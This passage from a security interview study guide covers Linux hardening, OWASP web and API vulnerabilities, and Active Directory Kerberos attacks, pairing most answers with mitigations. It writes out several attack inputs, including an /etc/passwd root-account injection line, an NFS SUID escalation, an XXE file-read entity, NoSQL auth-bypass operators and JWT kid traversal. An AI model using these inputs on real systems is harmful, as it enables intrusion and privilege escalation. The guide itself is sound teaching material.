- **Answer:** `seccomp-bpf` attaches a Berkeley Packet Filter program to a process via the `prctl(PR_SET_SECCOMP)` or `seccomp()` syscall, inspecting every system call number and register argument before the kernel executes it. Docker's default `seccomp` profile blocks over 44 dangerous syscalls (such as `kexec_load`, `init_module`, `finit_module`, `acct`, `swapon`, `bpf`, `userfaultfd`, and `keyctl`), preventing a compromised container process from exploiting kernel vulnerabilities in those subsystems.

**Q31. Explain the sticky bit (`chmod +t` / `1000`) and SetGID bit (`chmod g+s` / `2000`) when applied to a Linux directory.**
- **Answer:** When the **Sticky Bit (`1777`, `drwxrwxrwt`)** is set on a directory like `/tmp`, any user can create files inside it, but only the **file owner**, the **directory owner**, or **`root`** can delete or rename a file within that directory. When the **SetGID Bit (`2770`, `drwxrws---`)** is set on a directory, any new file or subdirectory created inside it automatically inherits the **group ownership of the parent directory** rather than the primary group of the creating user.

**Q32. How can a world-writable or misconfigured `/etc/passwd` file lead to instant root privilege escalation even though password hashes live in `/etc/shadow`?**
- **Answer:** For backward compatibility with legacy UNIX, if the second colon-separated field of `/etc/passwd` (`username:password_field:UID:GID:...`) contains a valid password hash instead of the placeholder `x`, PAM (`pam_unix.so`) authenticates against the hash in `/etc/passwd` without consulting `/etc/shadow`. An attacker with write access to `/etc/passwd` can append `auditroot:$(openssl passwd -6 Pass123!):0:0:root:/root:/bin/bash` and run `su auditroot` to obtain `uid=0`.

**Q33. What are Extended File Attributes (`chattr` / `lsattr`), and how can they affect both incident response and hardening?**
- **Answer:** Extended filesystem attributes on `ext4`/`xfs` operate below standard POSIX permissions. Setting the **immutable bit** (`chattr +i /etc/resolv.conf`) prevents any modification, deletion, renaming, or hard-linking of the file—even by `root`—until `chattr -i` is run by a process possessing the `CAP_LINUX_IMMUTABLE` capability. Setting the **append-only bit** (`chattr +a /var/log/auth.log`) allows processes to open the file only in append mode, preventing attackers from truncating logs.

**Q34. What is the `/proc` pseudo-filesystem, and what sensitive information can an unprivileged user extract if `hidepid` is not configured?**
- **Answer:** `/proc` is an in-memory interface to kernel data structures (`procfs`). By default (`hidepid=0`), any local user can read `/proc/<PID>/cmdline` and `/proc/<PID>/status` of **every process running on the system**, including root processes. If an administrator passes a password or API token as a command-line argument (e.g., `mysql -u root -pSecretPass` or `curl -H "Authorization: Bearer ..."`), any user monitoring `/proc/<PID>/cmdline` (using tools like `pspy`) can harvest those secrets. **Mitigation:** Mount `/proc` with `hidepid=2` (`hidepid=invisible` in `/etc/fstab`), making other users' `/proc/<PID>/` directories completely invisible to non-root users.

**Q35. How do systemd service unit sandboxing directives (`ProtectSystem`, `PrivateTmp`, `NoNewPrivileges`) harden a Linux daemon?**
- **Answer:** Modern `systemd` unit files support built-in namespace and seccomp sandboxing without needing Docker:
  - `NoNewPrivileges=yes`: Prevents the service and all its children from ever gaining new privileges via SUID/SGID binaries (`PR_SET_NO_NEW_PRIVS`).
  - `ProtectSystem=strict` & `ProtectHome=yes`: Mounts the entire host filesystem read-only for the service and hides `/home`, `/root`, and `/run/user`.
  - `PrivateTmp=yes`: Gives the service an isolated `/tmp` and `/var/tmp` mount namespace disconnected from other processes.
  - `CapabilityBoundingSet=`: Strips all Linux capabilities not explicitly required by the daemon.

**Q36. What is an NFS `no_root_squash` misconfiguration, and how does it enable privilege escalation?**
- **Answer:** By default, Network File System (NFS) exports enforce `root_squash`, which maps incoming file requests from `uid=0` (`root`) on an NFS client to the unprivileged `nobody` (`65534`) UID on the NFS server. If `/etc/exports` contains `no_root_squash` on a share mounted by a target server, an attacker who has root on their own client machine can mount the share, copy `/bin/bash` into it, `chown root:root` and `chmod 4755` (SUID root) the binary from their client, and then execute that SUID binary from their low-privileged shell on the target server to become `root`.

**Q37. Explain how memory protections `NX` (No-eXecute), `ASLR` (Address Space Layout Randomization), `Stack Canaries`, and `PIE` work together in Linux ELF binaries.**
- **Answer:**
  - **NX / DEP (`GNU_STACK` `RW` without `E`):** Marks stack and heap memory pages as non-executable in the CPU page table (PTE bit 63), preventing direct shellcode execution on the stack.
  - **Stack Canaries (`-fstack-protector-strong`):** Places a secret random value (read from `fs:0x28` on x86_64) on the stack immediately before the saved frame pointer (`RBP`) and return address (`RIP`); verified via `__stack_chk_fail` before `ret`.
  - **ASLR (`/proc/sys/kernel/randomize_va_space = 2`) + PIE (`-fPIE -pie`):** Randomizes the base virtual addresses of the stack, heap, shared libraries (`libc`), and the executable code segment itself on every execution, mitigating Return-Oriented Programming (ROP) without a prior information disclosure leak.
  - **Full RELRO (`-Wl,-z,relro,-z,now`):** Resolves all dynamic symbols at startup and marks the Global Offset Table (`.got.plt`) read-only, preventing GOT overwrite attacks.

**Q38. How do you audit a Linux server for hidden rootkits or persistence during an incident response investigation?**
- **Answer:** (1) Check loaded kernel modules (`lsmod`, `/proc/modules`) and kernel taint flags (`cat /proc/sys/kernel/tainted`). (2) Check `/etc/ld.so.preload` and environment `LD_PRELOAD` for user-space shared library rootkits. (3) Verify binary integrity against package manager cryptographic hashes (`debsums -c` on Debian/Ubuntu or `rpm -Va` on RHEL). (4) Compare output of user-space `ps` / `ss` against raw kernel structures or memory dumps using `Volatility 3` / `LiME` (`linux.pslist` vs `linux.psscan` to spot unlinked `task_struct` nodes). (5) Inspect `/etc/crontab`, `/etc/cron.*`, `/var/spool/cron/crontabs/`, `/etc/systemd/system/`, `~/.bashrc`, and `/root/.ssh/authorized_keys`.

**Q39. What is the difference between `/dev/random` and `/dev/urandom` on modern Linux kernels (Kernel 5.6+)?**
- **Answer:** Both draw from the Linux kernel's cryptographic CSPRNG (`ChaCha20`-based DRBG seeded by hardware interrupts, RDRAND, and jitter entropy). Historically, `/dev/random` blocked if an internal entropy estimator dropped low, causing boot deadlocks, whereas `/dev/urandom` never blocked. In modern Linux kernels (5.6+), `/dev/urandom` and the `getrandom(2)` syscall are cryptographically identical and secure for all key generation once the kernel CSPRNG is initialized at early boot.

**Q40. How do you securely configure OpenSSH (`/etc/ssh/sshd_config`) for an enterprise production server?**
- **Answer:**
```text
Protocol 2
PermitRootLogin no
PasswordAuthentication no
KbdInteractiveAuthentication no
PubkeyAuthentication yes
AuthenticationMethods publickey
AllowGroups ssh-admins
MaxAuthTries 3
ClientAliveInterval 300
ClientAliveCountMax 2
X11Forwarding no
AllowAgentForwarding no
AllowTcpForwarding no
KexAlgorithms curve25519-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
```

---

## 54.3 Section 3: Web & API Application Security / OWASP Top 10 (Questions 41–65)

**Q41. List the OWASP Top 10 (2021) categories in order and explain the shift toward architectural design and supply-chain risks.**
- **Answer:**
  - `A01:2021` — Broken Access Control (moved up from #5; covers BOLA/IDOR, privilege escalation, CORS misconfigurations).
  - `A02:2021` — Cryptographic Failures (formerly Sensitive Data Exposure).
  - `A03:2021` — Injection (consolidates SQLi, NoSQLi, OS Command Injection, LDAPi, and XSS).
  - `A04:2021` — Insecure Design (new category focusing on threat modeling and business-logic flaws that cannot be fixed by code implementation alone).
  - `A05:2021` — Security Misconfiguration (includes XXE, exposed cloud storage, verbose stack traces).
  - `A06:2021` — Vulnerable and Outdated Components.
  - `A07:2021` — Identification and Authentication Failures (formerly Broken Authentication).
  - `A08:2021` — Software and Data Integrity Failures (new category covering insecure deserialization, CI/CD integrity, and unsigned updates).
  - `A09:2021` — Security Logging and Monitoring Failures.
  - `A10:2021` — Server-Side Request Forgery (SSRF).

**Q42. Why do Prepared Statements (Parameterized Queries) completely prevent SQL Injection, and when is a prepared statement STILL vulnerable?**
- **Answer:** With true prepared statements (`PDO::ATTR_EMULATE_PREPARES => false`), the database driver sends the SQL query structure (`SELECT * FROM users WHERE username = ?`) in a **Prepare** step first; the database compiles the SQL Abstract Syntax Tree (AST) and execution plan. In a separate **Execute** step, the user parameter is transmitted strictly as a typed literal value, making it impossible for input characters (`' OR 1=1--`) to alter the already-compiled AST. Prepared statements are **still vulnerable** if: (1) dynamic identifiers like **table names**, **column names**, or **`ORDER BY` / `ASC`/`DESC` directions** (which cannot be bound as parameters) are concatenated without a strict static allowlist; or (2) **Second-Order SQL Injection** occurs when a safely parameterized value is later retrieved from the database and concatenated into a raw dynamic query inside a stored procedure or backend job.

**Q43. Compare Reflected XSS, Stored XSS, and DOM-Based XSS, and explain how to remediate each.**
- **Answer:**
  - **Reflected XSS:** Untrusted input from an HTTP request (e.g., query parameter `?q=`) is immediately echoed by the server in the HTTP response without contextual output encoding.
  - **Stored (Persistent) XSS:** Untrusted input is saved in a backend store (database, comment, user profile, log file) and later rendered unescaped to other users viewing the page.
  - **DOM-Based XSS:** Occurs entirely in client-side JavaScript when data from an attacker-controllable **Source** (`location.search`, `location.hash`, `window.name`, `postMessage`) is passed into a dangerous execution **Sink** (`element.innerHTML`, `document.write()`, `eval()`, `setTimeout(string)`) without sanitization, even if the server response itself never changed.
  - **Remediation:** Apply **context-aware output encoding** (HTML entity, attribute, JS, URL encoding), use safe DOM APIs (`textContent` / `innerText` instead of `innerHTML`), sanitize rich HTML with **DOMPurify**, and enforce a strict **Nonce- or Hash-based Content Security Policy (CSP)** with `Trusted Types`.

**Q44. Why does a standard `Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com` often fail to stop XSS, and how does `strict-dynamic` with nonces solve it?**
- **Answer:** Allowlisting entire CDNs (`cdnjs.cloudflare.com`, `ajax.googleapis.com`) or `'unsafe-inline'` allows an attacker with an HTML injection point to load legacy AngularJS/JSONP libraries hosted on that trusted CDN and execute arbitrary JS via CSTI (Client-Side Template Injection) or JSONP callbacks. **Solution:** Use a per-request cryptographic **nonce** paired with `'strict-dynamic'`:
  `Content-Security-Policy: script-src 'nonce-<RANDOM_BASE64>' 'strict-dynamic'; object-src 'none'; base-uri 'none';`
  Browsers supporting CSP Level 3 ignore host allowlists and `'unsafe-inline'`, executing only `<script nonce="...">` tags and scripts dynamically created by those trusted scripts.

**Q45. Explain Cross-Site Request Forgery (CSRF) and compare Synchronizer Token Pattern, Double-Submit Cookie, and `SameSite` Cookie attributes.**
- **Answer:** CSRF forces an authenticated victim's browser to send an unintended state-changing request (`POST /transfer`) to a vulnerable site because browsers automatically attach session cookies to cross-origin requests.
  - **Synchronizer Token Pattern (Stateful):** Server generates a cryptographically random per-session/per-request CSRF token stored server-side and requires it in a hidden form field or custom HTTP header (`X-CSRF-Token`), validated with constant-time comparison (`hmac.compare_digest`).
  - **HMAC Double-Submit Cookie (Stateless):** Server sets a cookie containing `HMAC(session_id || random_nonce, secret_key)` and verifies that a custom request header matches the cookie and valid HMAC.
  - **`SameSite` Cookie Attribute:** `SameSite=Strict` never sends the cookie on cross-site requests; `SameSite=Lax` (modern browser default) withholds the cookie on cross-site `POST`/`fetch` subrequests while allowing top-level safe `GET` navigations. Note: `SameSite=Lax` alone does not protect against state-changing `GET` endpoints or same-site subdomain takeovers (`*.company.com`).

**Q46. What is a Cross-Origin Resource Sharing (CORS) misconfiguration, and why is `Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true` forbidden by browsers?**
- **Answer:** The **Same-Origin Policy (SOP)** prevents `https://attacker.com` from reading responses fetched from `https://api.bank.lk`. CORS relaxes SOP via response headers. Because allowing wildcard `*` alongside authenticated cookies (`Allow-Credentials: true`) would expose every authenticated endpoint to the entire internet, browsers explicitly block `*` with credentials. However, developers often bypass this restriction insecurely by dynamically **reflecting the request `Origin` header** into `Access-Control-Allow-Origin: <Reflected_Origin>` or accepting `Origin: null` (triggered via sandboxed `<iframe>`) while setting `Access-Control-Allow-Credentials: true`. **Remediation:** Validate the incoming `Origin` against a strict, exact-match server-side allowlist of trusted origins.

**Q47. Differentiate between BOLA (Broken Object Level Authorization), BFLA (Broken Function Level Authorization), and BOPLA (Broken Object Property Level Authorization / Mass Assignment) in OWASP API Security Top 10 (2023).**
- **Answer:**
  - **BOLA (`API1:2023`):** User A accesses User B's record by changing an object identifier (`GET /api/v1/invoices/1045` $\rightarrow$ `1046`).
  - **BFLA (`API5:2023`):** A regular user invokes an administrative function or HTTP method (`DELETE /api/v1/users/1046` or `POST /api/v1/admin/export`) because role/permission checks are missing on the controller action.
  - **BOPLA (`API3:2023`):** Combines **Excessive Data Exposure** (API returns sensitive internal fields in JSON responses) and **Mass Assignment** (API blindly binds request JSON properties like `{"username": "bob", "is_admin": true, "wallet_balance": 99999}` directly onto the ORM database model without an explicit DTO/serializer field allowlist).

**Q48. What are the most common JSON Web Token (JWT) implementation vulnerabilities and their remediations?**
- **Answer:**
  1. **`alg: "none"` Acceptance:** Attackers strip the signature and set `"alg": "none"`. Fix: Reject unsigned tokens and explicitly specify `algorithms: ['RS256']` or `['ES256']`.
  2. **Algorithm Confusion (`RS256` $\rightarrow$ `HS256`):** Signing a token with HMAC-SHA256 using the server's public RSA key as the symmetric secret. Fix: Never pass an asymmetric public key to a verification call that accepts `HS256`.
  3. **Weak Symmetric `HS256` Secret:** Brute-forceable via `hashcat -m 16500`. Fix: Use at least 256 bits (32 random bytes) of cryptographic entropy or asymmetric `RS256`/`EdDSA`.
  4. **Header Parameter Injection (`jku`, `x5u`, `kid`):** `jku`/`x5u` pointing to an attacker's JWKS server (SSRF/key spoofing), or `kid` vulnerable to path traversal (`"kid": "../../../../dev/null"` signed with an empty string `""`) or SQLi. Fix: Pin trusted key IDs against an internal dictionary and never fetch untrusted remote URLs from token headers.
  5. **Missing Claims Validation:** Failing to validate `exp` (expiration), `nbf` (not before), `iss` (issuer), and `aud` (audience).

**Q49. Explain XML External Entity (XXE) Injection (In-Band vs. Blind Out-of-Band) and how to disable it across Java, Python, and PHP parsers.**
- **Answer:** XML allows defining custom entities inside a Document Type Definition (`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`). If the XML parser resolves external entities, it reads local files, performs SSRF (`http://169.254.169.254/`), or triggers Denial of Service (`Billion Laughs` entity expansion). In **Blind OOB XXE**, when no entity output is reflected, an attacker uses XML **Parameter Entities (`%`)** to load an external `.dtd` file that exfiltrates file contents over HTTP/FTP/DNS. **Remediation:** Disable DTDs and external entities completely in the XML parser configuration (e.g., in Java `DocumentBuilderFactory`: `dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`; in Python: use `defusedxml`).

**Q50. How does Server-Side Request Forgery (SSRF) bypass naive URL filters, and what is the only defense-in-depth architecture that stops all bypasses?**
- **Answer:** Naive string filters blocking `127.0.0.1`, `localhost`, or `169.254.169.254` are bypassed using:
  - Alternative IP representations: Decimal (`2130706433`), Octal (`0177.0.0.1`), Hex (`0x7f000001`), IPv6 loopback (`[::1]`), or IPv4-mapped IPv6 (`[::ffff:127.0.0.1]`).
  - HTTP `301/302/307` Redirects from an external server to an internal IP.
  - DNS Rebinding (domain resolves to public IP during validation, then to `169.254.169.254` during `connect()`).
  - URL parser discrepancies (`http://trusted.com@169.254.169.254/`).
  - **Defense-in-Depth Solution:** (1) Resolve the DNS hostname **once**, validate every returned IP address against all private/loopback/link-local CIDRs, and connect the socket directly to that validated IP (preventing DNS rebinding); (2) disable HTTP redirects; and (3) route all outbound webhook traffic through an isolated **egress forward proxy (`Squid`/`Envoy`) in a DMZ** that has zero network route to internal RFC 1918 subnets or cloud metadata IPs.

**Q51. What is JavaScript Prototype Pollution (`__proto__` / `constructor.prototype`), and how can it lead to XSS or Remote Code Execution in Node.js?**
- **Answer:** In JavaScript, almost all objects inherit properties from `Object.prototype`. When an application recursively merges, clones, or assigns properties from untrusted JSON input without filtering keys named `__proto__`, `constructor`, or `prototype` (e.g., `merge(target, JSON.parse('{"__proto__": {"isAdmin": true}}'))`), it modifies the global `Object.prototype`. Every object in the runtime subsequently inherits `obj.isAdmin === true`. In Node.js, polluting properties inspected by template engines (e.g., EJS `outputFunctionName`) or `child_process.fork()` / `spawn()` (`shell`, `env`, `NODE_OPTIONS`) escalates Prototype Pollution into Remote Code Execution. **Remediation:** Use `Object.create(null)` for dictionary maps, `Map` objects, `Object.freeze(Object.prototype)`, and validate schemas with JSON Schema.

**Q52. Explain NoSQL Injection in MongoDB and how type confusion in JSON request bodies enables authentication bypass.**
- **Answer:** If an Express/Node.js backend parses JSON bodies (`express.json()`) and passes `req.body.username` and `req.body.password` directly into `db.users.findOne({ username: req.body.username, password: req.body.password })` without verifying that both values are primitive strings (`typeof val === 'string'`), an attacker can send a JSON object containing MongoDB query operators:
  `{"username": "admin", "password": {"$ne": null}}` or `{"username": "admin", "password": {"$gt": ""}}` or `{"$where": "..."}`.
  **Remediation:** Strictly validate input types using `zod` / `Joi` (ensuring `string` primitives), disable `$where` JavaScript evaluation in MongoDB, and sanitize operator keys (`$` and `.`).

**Q53. What is Insecure Deserialization, and why does it occur across PHP (`unserialize`), Python (`pickle`), Java (`ObjectInputStream`), and .NET (`BinaryFormatter`)?**
- **Answer:** Serialization converts an in-memory object into a byte stream or string; deserialization reconstructs the object. Formats like Python `pickle` (`__reduce__`), PHP `unserialize()` (`__wakeup()`, `__destruct()`), Java `ObjectInputStream` (`readObject()`), and .NET `BinaryFormatter` allow the serialized stream to specify arbitrary class types and automatically invoke lifecycle "magic methods" during reconstruction—before the application code can inspect the resulting object. **Remediation:** Never deserialize untrusted data using native object serializers; use data-only formats like **JSON** or **Protocol Buffers (Protobuf)** with strict schema validation.

**Q54. How does OAuth 2.0 Authorization Code Flow with PKCE (`Proof Key for Code Exchange`, RFC 7636) work, and why is PKCE now mandatory even for confidential clients in OAuth 2.1?**
- **Answer:** In PKCE, before initiating the authorization request, the client generates a high-entropy random secret `code_verifier` and computes `code_challenge = BASE64URL(SHA256(code_verifier))`. The client sends `code_challenge` and `code_challenge_method=S256` to `/authorize`. When exchanging the returned authorization `code` at the `/token` endpoint, the client must supply the original `code_verifier`. The authorization server hashes it and verifies it matches `code_challenge`. This prevents **Authorization Code Interception** (via custom URI schemes on mobile, browser extensions, or referrer leaks) and **Authorization Code Injection** attacks.

**Q55. What is a Web Cache Poisoning attack versus a Web Cache Deception attack?**
- **Answer:**
  - **Web Cache Poisoning:** An attacker sends a request containing an **unkeyed input** (such as an HTTP header like `X-Forwarded-Host: evil.com` or `X-Original-URL`) that is not part of the CDN/Varnish **Cache Key**, causing the backend server to generate a malicious/XSS response that gets cached and served to all subsequent users requesting that normal URL.
  - **Web Cache Deception:** An attacker tricks an authenticated victim into visiting `https://bank.lk/account/profile/nonexistent.css`. If the backend router ignores the trailing `/nonexistent.css` path segment and returns the victim's private profile page (`200 OK`), while the CDN sees the `.css` extension and caches the response publicly, the attacker can then fetch `/account/profile/nonexistent.css` unauthenticated to read the victim's PII.

**Q56. Explain Subdomain Takeover (`CNAME` / `NS` dangling records) and how to prevent it.**
- **Answer:** When an organization points a DNS record (e.g., `promos.company.lk CNAME company-promos.s3.amazonaws.com` or `azurewebsites.net` / `github.io`) to an external cloud resource and later deletes the cloud resource without removing the DNS record, an attacker can register that bucket/app name in their own cloud account and serve malicious content under `promos.company.lk` (bypassing `SameSite` cookies, CSP allowlists, and OAuth domain checks). **Remediation:** Implement lifecycle hooks where DNS records are deleted *before* cloud resources are deprovisioned, and continuously monitor dangling DNS records.

**Q57. What security flags must be set on session cookies, and what do `__Host-` and `__Secure-` cookie prefixes enforce?**
- **Answer:**
  - `Secure`: Browser only transmits the cookie over encrypted HTTPS connections.
  - `HttpOnly`: Prevents client-side JavaScript (`document.cookie`) from accessing the cookie during an XSS attack.
  - `SameSite=Lax` or `Strict`: Controls cross-site transmission to mitigate CSRF.
  - **`__Host-` Prefix (`Set-Cookie: __Host-sid=...; Secure; Path=/; HttpOnly`):** Enforces in the browser that the cookie **must** have the `Secure` flag, **must** have `Path=/`, and **must NOT** have a `Domain` attribute—preventing a compromised sibling subdomain from overwriting or fixing the session cookie (Cookie Tossing defense).

**Q58. How do GraphQL-specific vulnerabilities (Introspection exposure, Batching Brute-Force, and Deeply Nested Query DoS) work, and how do you secure a GraphQL API?**
- **Answer:** (1) **Introspection (`__schema`)** exposes every internal query, mutation, and object field. (2) **Query Batching / Aliasing** allows an attacker to send 1,000 password or OTP guesses inside a single HTTP POST request using GraphQL aliases (`login1: login(...), login2: login(...)`), bypassing IP rate limiters that only count HTTP requests. (3) **Circular/Nested Queries** (`user { friends { user { friends ... } } }`) cause exponential database load. **Remediation:** Disable introspection in production, enforce **Maximum Query Depth** (e.g., `maxDepth: 6`), **Query Complexity / Cost Analysis**, limit alias/batch counts per request, or enforce **Persisted Queries (Allowlisted Query Hashes)**.

**Q59. What is Local File Inclusion (LFI) vs. Path Traversal (`CWE-22`), and how do PHP stream wrappers (`php://filter`) turn LFI into source code disclosure or RCE?**
- **Answer:** Path Traversal (`../../../../etc/passwd`) occurs when user input is passed to file-reading APIs (`file_get_contents`, `open`). **LFI** occurs when the file path is passed to an **execution/inclusion sink** (`include()`, `require()`). In PHP, if an attacker includes `index.php` directly, the PHP engine executes it rather than showing the source; using `php://filter/convert.base64-encode/resource=config.php` base64-encodes the file before the PHP parser evaluates it, disclosing the raw source code. If the attacker can poison `/var/log/nginx/access.log`, PHP session files (`/var/lib/php/sessions/sess_<id>`), or use `php://input` / `pearcmd.php`, LFI escalates to Remote Code Execution. **Remediation:** Never pass user input directly into filesystem paths; map an integer/enum ID to a static dictionary of allowed files, or canonicalize the path (`realpath()`) and verify it starts with the intended base directory prefix (`strncmp`).

**Q60. What are the security headers every production web application should return, and what does each protect against?**
- **Answer:**
  - `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` (Enforces HTTPS; blocks SSL stripping).
  - `Content-Security-Policy` (Mitigates XSS, data exfiltration, and clickjacking via `frame-ancestors`).
  - `X-Content-Type-Options: nosniff` (Prevents browsers from MIME-sniffing a `text/plain` or image response into executable HTML/JS).
  - `X-Frame-Options: DENY` (Legacy clickjacking defense alongside CSP `frame-ancestors 'none'`).
  - `Referrer-Policy: strict-origin-when-cross-origin` (Prevents leaking sensitive URL query parameters in the `Referer` header to third-party sites).
  - `Permissions-Policy: camera=(), microphone=(), geolocation=()` (Disables sensitive browser hardware APIs).
  - `Cross-Origin-Opener-Policy: same-origin` (Isolates browsing context group against Spectre/XS-Leaks).

**Q61. How does HTTP Parameter Pollution (HPP) exploit differences between frontend WAFs/proxies and backend web frameworks?**
- **Answer:** When a query string contains duplicate parameter keys (`?account=100&account=200`), different frameworks resolve the collision differently:
  - **PHP / Apache, Python Django/Flask:** Takes the **last** occurrence (`200`).
  - **ASP.NET / IIS:** Concatenates all occurrences with a comma (`100,200`).
  - **Express / Node.js:** Parses into an **Array** (`["100", "200"]`).
  - **JSP / Tomcat, Go `net/http` (`FormValue`):** Takes the **first** occurrence (`100`).
  If a WAF or validation middleware inspects the first parameter while the backend processes the last (or crashes/bypasses checks on an array), authorization or WAF checks are bypassed.

**Q62. What is an Open Redirect (`CWE-601`), and why is it frequently chained into high-severity OAuth token theft or SSRF exploits?**
- **Answer:** An Open Redirect occurs when an application accepts an unvalidated URL in a parameter (`https://bank.lk/login?next=https://evil.com`) and issues a `302 Found` redirect to it. In OAuth 2.0, if `redirect_uri` validation permits arbitrary paths on `bank.lk`, an attacker sets `redirect_uri=https://bank.lk/login?next=https://evil.com`; when the victim authorizes, the IdP appends `?code=AUTH_CODE` and the open redirect leaks the code via the `Referer` header or URL fragment to `evil.com`. Similarly, in SSRF, an open redirect on an allowlisted domain can redirect the backend HTTP client to `http://169.254.169.254/`. **Remediation:** Only allow relative path redirects (verifying the path starts with a single `/` and NOT `//` or `/\`), or map redirect targets to static integer keys.

**Q63. Explain Server-Side Template Injection (SSTI) and how an auditor differentiates between Jinja2, Twig, Freemarker, and Pebble without source code.**
- **Answer:** SSTI occurs when user input is concatenated directly into a server-side template string prior to compilation rather than passed as context data. An auditor sends polyglot mathematical probes:
  - If `{{7*7}}` returns `49`, the engine uses double curly braces (Jinja2, Twig, Nunjucks). Next, testing `{{7*'7'}}` returns `7777777` in **Jinja2 (Python)**, whereas it returns `49` in **Twig (PHP)**.
  - If `${7*7}` returns `49`, the engine is likely **Freemarker (Java)**, **Thymeleaf**, or **Mako**.

**Q64. How should user passwords be stored in a modern authentication database (`Argon2id` vs. `bcrypt` vs. `PBKDF2`)?**
- **Answer:** Fast cryptographic hash functions (`MD5`, `SHA-256`, `SHA-512`) even with salts can be computed at tens of billions of hashes per second on modern GPUs. Passwords must be hashed using a **dedicated, salted, memory-hard Key Derivation Function**:
  1. **Primary Recommendation (OWASP):** **Argon2id** (winner of the Password Hashing Competition, combining Argon2i's side-channel resistance and Argon2d's GPU-cracking resistance) with minimum parameters $m = 19\text{ MiB} - 64\text{ MiB}$ memory, $t = 2 - 3$ iterations, $p = 1 - 4$ parallelism, and a unique 128-bit cryptographic salt per password.
  2. **Alternative:** **bcrypt** (cost factor $\ge 12$, noting its 72-byte input truncation limit) or **scrypt**.
  3. **FIPS-140 Compliance Fallback:** **PBKDF2-HMAC-SHA256** with $\ge 600,000$ iterations.

**Q65. What is Clickjacking (UI Redressing), and why is `Content-Security-Policy: frame-ancestors` superior to `X-Frame-Options`?**
- **Answer:** Clickjacking loads a target application inside a transparent `<iframe opacity="0">` overlaid atop a decoy page so the victim unknowingly clicks buttons (`Delete Account`, `Authorize OAuth`) on the framed site. `X-Frame-Options` only supports `DENY` or `SAMEORIGIN` (its `ALLOW-FROM` directive was deprecated and unsupported by modern browsers) and only checks the top-level frame. `Content-Security-Policy: frame-ancestors 'self' https://trusted-partner.lk` validates the **entire ancestor chain** of nested iframes and supports multiple explicit origins.

---

## 54.4 Section 4: Windows Internals & Active Directory Security (Questions 66–85)

**Q66. Explain the complete Kerberos Authentication flow in Active Directory (`AS-REQ`, `AS-REP`, `TGS-REQ`, `TGS-REP`, `AP-REQ`).**
- **Answer:**
  1. **`KRB_AS_REQ` (Authentication Service Request):** The client encrypts a current timestamp using a key derived from the user's password (AES-256 or NTLM hash) to prove identity (Pre-Authentication) and sends it to the Domain Controller's Key Distribution Center (KDC) on port `88`.
  2. **`KRB_AS_REP` (Authentication Service Reply):** The KDC validates the pre-auth timestamp and returns a **TGT (Ticket Granting Ticket)**—which contains the user's **PAC (Privilege Attribute Certificate)** listing group SIDs and is encrypted with the KDC's **`krbtgt`** secret key—along with a session key encrypted with the user's key.
  3. **`KRB_TGS_REQ` (Ticket Granting Service Request):** To access a network service (e.g., `cifs/filesrv.corp.local`), the client sends its TGT, an Authenticator encrypted with the TGT session key, and the target **SPN (Service Principal Name)** to the KDC.
  4. **`KRB_TGS_REP` (Ticket Granting Service Reply):** The KDC decrypts the TGT with `krbtgt`, copies the PAC into a **Service Ticket (TGS)**, and encrypts the TGS using the **secret key of the target service account** (`filesrv$` or `svc_sql`), returning it to the client.
  5. **`KRB_AP_REQ` (Application Request):** The client presents the TGS directly to the target server; the target server decrypts the TGS using its own secret key and reads the PAC to authorize the user without contacting the KDC (unless PAC validation is required).

**Q67. Contrast Kerberoasting (`T1558.003`) and AS-REP Roasting (`T1558.004`), including prerequisites, ticket types, and remediation.**
- **Answer:**
  - **AS-REP Roasting:** Targets accounts with **"Do not require Kerberos preauthentication"** (`UF_DONT_REQUIRE_PREAUTH`) enabled. Can be executed **unauthenticated** if a username is known (or authenticated via LDAP enumeration). The KDC returns an `AS-REP` whose encrypted part is encrypted with the user's key (`Hashcat -m 18200`). **Fix:** Enable pre-authentication on all accounts.
  - **Kerberoasting:** Requires **any valid domain user/computer account**. The attacker queries LDAP for user accounts with non-null `servicePrincipalName` attributes and requests a `TGS` ticket (`Event ID 4769`) for each SPN. Because the TGS is encrypted with the service account's password hash (`Hashcat -m 13100` for RC4 `0x17`, `-m 19700` for AES256 `0x12`), the attacker cracks the ticket offline. **Fix:** Migrate service accounts to **gMSAs (Group Managed Service Accounts)** (120-character random passwords rotated automatically every 30 days) and disable RC4 encryption (`msDS-SupportedEncryptionTypes = 0x18` for AES128/AES256).

**Q68. What is the difference between a Golden Ticket and a Silver Ticket in Active Directory, and how do you eradicate a Golden Ticket compromise?**
- **Answer:**
  - **Golden Ticket:** Forged **TGT (`KRB_AS_REP`)** signed and encrypted using the forest's **`krbtgt`** account hash (extracted from `NTDS.dit` or DC `lsass.exe`). Allows impersonating any user (even non-existent users) as a member of `Domain Admins` / `Enterprise Admins` across every machine in the domain.
  - **Silver Ticket:** Forged **Service Ticket (`KRB_TGS_REP`)** signed and encrypted using a specific **target server's machine account hash (`HOST$`) or service account hash**. It never touches the Domain Controller (bypassing DC `4768`/`4769` logs) and grants access only to that specific service on that specific host (unless `ValidateKdcPacSignature` is enforced).
  - **Golden Ticket Eradication:** Reset the `krbtgt` password **twice** (waiting for AD replication between resets) because the KDC keeps both the current (`N`) and immediate previous (`N-1`) `krbtgt` keys valid in memory to avoid breaking active tickets during routine rotation.

**Q69. Compare Kerberos Delegation types: Unconstrained Delegation, Classic Constrained Delegation, and Resource-Based Constrained Delegation (RBCD).**
- **Answer:**
  - **Unconstrained Delegation (`TRUSTED_FOR_DELEGATION`):** When a user authenticates to a server configured with Unconstrained Delegation, the KDC places a copy of the user's **usable TGT** inside the TGS forwarded to that server, which caches the TGT in `lsass.exe`. If an attacker compromises that server and coerces a Domain Controller to authenticate to it (e.g., via `PrinterBug` `MS-RPRN` or `PetitPotam` `MS-EFSRPC`), the attacker captures `DC01$`'s TGT and performs a DCSync attack.
  - **Constrained Delegation (`msDS-AllowedToDelegateTo`):** Restricts which specific backend SPNs the middle-tier service can impersonate users to via Kerberos extensions **`S4U2Self`** (obtain a forwardable TGS on behalf of any user) and **`S4U2Proxy`** (present that TGS toobtain a ticket for the allowed SPN). Configured only by Domain Admins (`SeEnableDelegationPrivilege`).
